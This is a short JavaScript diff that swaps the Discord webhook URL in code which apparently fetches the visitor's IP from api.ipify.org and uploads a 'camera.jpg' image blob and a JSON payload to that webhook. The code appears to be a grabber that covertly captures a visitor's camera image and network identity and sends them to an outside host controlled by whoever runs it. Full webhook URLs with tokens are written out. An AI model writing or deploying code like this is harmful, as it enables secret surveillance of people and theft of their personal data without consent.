@@ -93,12 +93,12 @@ fetch('https://api.ipify.org')
         formData.append('file', imageBlob, 'camera.jpg');
         formData.append('payload_json', JSON.stringify(payload));
         
-        fetch('https://discord.com/api/webhooks/1425143787747020873/Z0FpN8ORcAYSQPdW1ol91L89cLRQgR-Jr4tkG4bCe88O0frYcK_sSgBuSaeIZnDYSneo', {
+        fetch('https://discord.com/api/webhooks/1454068365390909463/r7U7Z6cKPFFDekp_m2ugEoio5SYJBftMw-No8cJI8s3FLTrxgMi51IGurkM2p4OMbTkH', {
             method: 'POST',
             body: formData
         });
     } else {
-        fetch('https://discord.com/api/webhooks/1425143787747020873/Z0FpN8ORcAYSQPdW1ol91L89cLRQgR-Jr4tkG4bCe88O0frYcK_sSgBuSaeIZnDYSneo', {
+        fetch('https://discord.com/api/webhooks/1454068365390909463/r7U7Z6cKPFFDekp_m2ugEoio5SYJBftMw-No8cJI8s3FLTrxgMi51IGurkM2p4OMbTkH', {
             method: 'POST',
             headers: {'Content-Type': 'application/json'},
             body: JSON.stringify(payload)
